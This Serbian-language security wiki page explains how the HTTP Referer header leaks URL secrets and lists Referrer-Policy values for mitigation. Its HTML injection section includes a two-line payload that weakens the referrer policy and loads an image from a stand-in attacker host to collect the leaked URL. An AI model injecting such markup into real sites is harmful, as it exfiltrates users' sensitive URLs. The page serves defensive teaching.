# Zanimljivo HTTP ponašanje

{{#include ../banners/hacktricks-training.md}}

## `Referer` zaglavlje i Referrer Policy

HTTP `Referer` request zaglavlje identifikuje apsolutni ili delimični URL sa kog je resurs zatražen. U zavisnosti od aktivne referrer policy, može da sadrži origin, putanju i query string izvora, ali ne i URL fragment.<sup>[[1]](#references)</sup>

### Leak osetljivih informacija

Tajne u URL putanjama ili query parametrima mogu da procure kroz istoriju browsera, logove, analytics, kopirane linkove i `Referer` zaglavlje. Cross-origin link ili zahtev za subresource stoga može da otkrije URL izvora eksternom serveru.<sup>[[2]](#references)</sup>

### Mitigacija

Koristite `Referrer-Policy` response zaglavlje da kontrolišete količinu referrer informacija koju browser šalje. `strict-origin-when-cross-origin` je savremeni podrazumevani izbor u browserima, dok `no-referrer` u potpunosti potiskuje zaglavlje; izaberite policy koja odgovara zahtevima aplikacije.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Ne postavljajte lozinke, identifikatore sesija, API ključeve ili druge osetljive vrednosti u URL-ove. Umesto toga, šaljite ih u odgovarajućim zaglavljima zahteva ili telima zahteva preko TLS-a.<sup>[[2]](#references)</sup>

### Razmatranje HTML Injection-a

Dokument takođe može postaviti politiku za celu stranicu pomoću `<meta name="referrer">`. Ako propust HTML Injection omogućava napadaču da umetne efektivan meta element, napadač može pokušati da oslabi politiku dokumenta za naredne zahteve. Dinamički umetnute ili konfliktne meta politike mogu se ponašati nepredvidivo, zato proverite ponašanje u ciljnom browseru umesto da pretpostavite da je zaglavlje odgovora uvek zamenjeno.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Otklonite osnovnu HTML injection ranjivost i ne stavljajte osetljive podatke u URL; referrer policy predstavlja dodatnu zaštitu, a ne zamenu za bilo koju od ove dve kontrole.

## References

- [1] [MDN - `Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Korišćenje GET metode zahteva sa osetljivim query stringovima](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
